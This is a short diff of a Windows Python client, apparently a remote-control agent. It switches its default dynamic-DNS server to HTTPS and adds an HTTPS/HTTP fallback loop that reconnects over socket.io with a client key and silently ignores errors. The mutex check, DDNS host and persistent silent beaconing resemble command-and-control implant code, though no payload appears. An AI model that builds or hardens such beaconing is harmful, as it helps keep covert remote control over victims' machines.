@@ -33,7 +33,7 @@ if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
 
 # ── Server Configuration & Unique Client Identity ────────────────────────────
 
-VPS_URL: str = os.getenv("VPS_URL", "http://runx.ddns.net")
+VPS_URL: str = os.getenv("VPS_URL", "https://runx.ddns.net")
 
 # Attempt import of build-time etched configuration if compiled by build.py
 try:
@@ -1067,18 +1067,27 @@ def main() -> None:
     hb_thread = threading.Thread(target=heartbeat_loop, daemon=True)
     hb_thread.start()
 
+    urls_to_try = [VPS_URL]
+    if VPS_URL.startswith("https://"):
+        urls_to_try.append(VPS_URL.replace("https://", "http://"))
+    elif VPS_URL.startswith("http://"):
+        urls_to_try.insert(0, VPS_URL.replace("http://", "https://"))
+
     while True:
-        try:
-            if not sio.connected:
-                sio.connect(
-                    VPS_URL,
-                    wait_timeout=10,
-                    transports=["websocket", "polling"],
-                    auth={"token": CLIENT_KEY},
-                )
-                sio.wait()
-        except Exception:
-            pass
+        for target_url in urls_to_try:
+            try:
+                if not sio.connected:
+                    sio.connect(
+                        target_url,
+                        wait_timeout=10,
+                        transports=["websocket", "polling"],
+                        auth={"token": CLIENT_KEY},
+                    )
+                    sio.wait()
+            except Exception:
+                pass
+            if sio.connected:
+                break
         time.sleep(5)
 
 
